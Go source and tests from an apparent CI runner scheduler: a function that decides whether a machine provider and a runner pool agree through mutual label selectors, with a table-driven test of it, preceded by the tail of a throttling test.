	h.RunnerProfile.Standard = store.RunnerStandard{CPUs: 3, MemoryMB: 8 * 1024}
	if got := ThrottleReason(h); !strings.Contains(got, "throttled to 1 of 3 slots") {
		t.Fatalf("the slots are not the profile's: %q", got)
	}
}

package scheduler

import (
	"fmt"
	"sort"
	"strings"

	"github.com/eyupio/zoomies/internal/store"
)

// The two halves of a pool's agreement with a provider.
//
// A pool already says which hosts it may land on (host_selector, matched against
// a host's labels), and a provider already says what its machines are (its
// machine labels). Renting is spending money, so both sides get a say in the
// same way and a machine is bought only where both agree:
//
//   - the provider's pool_selector says which pools it will buy for, matched
//     against the pool's labels and name;
//   - the pool's provider_selector says which providers may buy for it, matched
//     against the provider's name, kind and machine labels.
//
// An empty selector on either side constrains nothing, which is what every
// provider and pool meant before either could say otherwise. These functions are
// pure, as the rest of this package is, because the machine decision, the pool
// editor's "providers that would rent for this" and the explanation an operator
// reads must all be the same answer.

// Pairing is one provider and one pool, judged on the two selectors.
type Pairing struct {
	// Agrees is true when neither side's selector rules the other out.
	Agrees bool `json:"agrees"`
	// By names the side that refused: "provider" or "pool". Empty when Agrees.
	By string `json:"by,omitempty"`
	// Why says what did not match, in the voice of the setting an operator
	// would edit, and Fix what to change. Both empty when Agrees.
	Why string `json:"why,omitempty"`
	Fix string `json:"fix,omitempty"`
}

// Pair judges a provider and a pool on their two selectors. It does not ask
// whether the machine the provider makes would suit the pool (backend,
// platform, size): that is HostCouldRun's question, asked of the machine the
// provider would build.
func Pair(p *store.Provider, pool *store.Pool) Pairing {
	if key, want, ok := firstMiss(p.PoolSelector, func(k string) (string, bool) { return poolSelectorValue(pool, k) }); !ok {
		return Pairing{
			By:  "provider",
			Why: fmt.Sprintf("provider %s only rents for pools matching %s, and %s", p.Name, formatSelector(p.PoolSelector), missWhy("pool "+pool.Name, key, want)),
			Fix: fmt.Sprintf("edit the provider's pool selector, or give the pool %s", wantLabel(key, want)),
		}
	}
	if key, want, ok := firstMiss(pool.ProviderSelector, func(k string) (string, bool) { return providerSelectorValue(p, k) }); !ok {
		return Pairing{
			By:  "pool",
			Why: fmt.Sprintf("pool %s only lets providers matching %s rent for it, and %s", pool.Name, formatSelector(pool.ProviderSelector), missWhy("provider "+p.Name, key, want)),
			Fix: fmt.Sprintf("edit the pool's provider selector, or give the provider's machines the label %s=%s", key, want),
		}
	}
	return Pairing{Agrees: true}
}

// firstMiss returns the first selector entry (in key order, so the sentence is
// stable) that the subject does not satisfy.
func firstMiss(sel map[string]string, value func(key string) (string, bool)) (key, want string, ok bool) {
	keys := make([]string, 0, len(sel))
	for k := range sel {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		got, has := value(k)
		// An entry with no value asks only that the subject carries the key.
		if sel[k] == "" {
			if !has {
				return k, "", false
			}
			continue
		}
		if !has || !strings.EqualFold(got, sel[k]) {
			return k, sel[k], false
		}
	}
	return "", "", true
}

// poolSelectorValue is what a pool answers for a key in a provider's
// pool_selector: a built-in (name, backend), or the value of a `key=value`
// label it carries. A bare label answers for itself, with an empty value, so
// `large` as a selector key asks for a pool labelled "large".
func poolSelectorValue(pool *store.Pool, key string) (string, bool) {
	switch strings.ToLower(key) {
	case "name":
		return pool.Name, true
	case "backend":
		return string(pool.Backend), pool.Backend != ""
	}
	for _, l := range pool.Labels {
		if strings.EqualFold(l, key) {
			return "", true
		}
		if k, v, found := strings.Cut(l, "="); found && strings.EqualFold(k, key) {
			return v, true
		}
	}
	return "", false
}

// providerSelectorValue is what a provider answers for a key in a pool's
// provider_selector: a built-in (name, kind), or one of its machine labels.
func providerSelectorValue(p *store.Provider, key string) (string, bool) {
	switch strings.ToLower(key) {
	case "name":
		return p.Name, true
	case "kind":
		return string(p.Kind), true
	}
	v, ok := p.MachineLabels[key]
	return v, ok
}

func formatSelector(sel map[string]string) string {
	keys := make([]string, 0, len(sel))
	for k := range sel {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	parts := make([]string, 0, len(keys))
	for _, k := range keys {
		if sel[k] == "" {
			parts = append(parts, k)
		} else {
			parts = append(parts, k+"="+sel[k])
		}
	}
	return strings.Join(parts, ", ")
}

func missWhy(subject, key, want string) string {
	if want == "" {
		return fmt.Sprintf("%s has no %q label", subject, key)
	}
	return fmt.Sprintf("%s does not have %s=%s", subject, key, want)
}

func wantLabel(key, want string) string {
	if want == "" {
		return fmt.Sprintf("the label %q", key)
	}
	return fmt.Sprintf("the label %s=%s", key, want)
}

package scheduler

import (
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

func TestAProviderAndAPoolAgreeOnlyWhenBothSelectorsAllowIt(t *testing.T) {
	pool := &store.Pool{Name: "linux-large", Backend: store.BackendDocker, Labels: store.StringSlice{"linux", "x64", "tier=large"}}
	prov := &store.Provider{Name: "proxmox-lab", Kind: store.ProviderProxmox, MachineLabels: store.StringMap{"site": "garage"}}

	tests := []struct {
		name         string
		providerSel  map[string]string
		poolSel      map[string]string
		wantAgrees   bool
		wantBy       string
		wantWhyIn    string
		wantFixInStr string
	}{
		{name: "neither side restricts anything", wantAgrees: true},
		{name: "the provider asks for a label the pool carries", providerSel: map[string]string{"linux": ""}, wantAgrees: true},
		{name: "the provider asks for a key=value label the pool carries", providerSel: map[string]string{"tier": "large"}, wantAgrees: true},
		{name: "the provider names the pool", providerSel: map[string]string{"name": "linux-large"}, wantAgrees: true},
		{name: "the pool asks for a machine label the provider has", poolSel: map[string]string{"site": "garage"}, wantAgrees: true},
		{name: "the pool asks for the provider's kind", poolSel: map[string]string{"kind": "proxmox"}, wantAgrees: true},
		{
			name: "the provider wants a label the pool lacks", providerSel: map[string]string{"gpu": ""},
			wantBy: "provider", wantWhyIn: `has no "gpu" label`, wantFixInStr: "pool selector",
		},
		{
			name: "the provider wants another value of a label", providerSel: map[string]string{"tier": "small"},
			wantBy: "provider", wantWhyIn: "tier=small", wantFixInStr: "pool selector",
		},
		{
			name: "the pool wants a machine label the provider lacks", poolSel: map[string]string{"site": "office"},
			wantBy: "pool", wantWhyIn: "site=office", wantFixInStr: "provider selector",
		},
		{
			// Renting is spending money, so one side's yes never outweighs the
			// other's no.
			name: "one side agreeing is not enough", providerSel: map[string]string{"linux": ""}, poolSel: map[string]string{"site": "office"},
			wantBy: "pool", wantWhyIn: "site=office",
		},
		{name: "case is not significant, as it is not for GitHub labels", providerSel: map[string]string{"LINUX": ""}, wantAgrees: true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			p := *prov
			p.PoolSelector = tc.providerSel
			q := *pool
			q.ProviderSelector = tc.poolSel

			got := Pair(&p, &q)
			if got.Agrees != tc.wantAgrees || got.By != tc.wantBy {
				t.Fatalf("Pair = %+v, want agrees=%v by=%q", got, tc.wantAgrees, tc.wantBy)
			}
			if tc.wantAgrees {
				if got.Why != "" || got.Fix != "" {
					t.Errorf("an agreement carries a refusal: %+v", got)
				}
				return
			}
			if !strings.Contains(got.Why, tc.wantWhyIn) {
				t.Errorf("Why %q does not say %q", got.Why, tc.wantWhyIn)
			}
			if !strings.Contains(got.Fix, tc.wantFixInStr) {
				t.Errorf("Fix %q does not name %q", got.Fix, tc.wantFixInStr)
			}
		})
	}
}

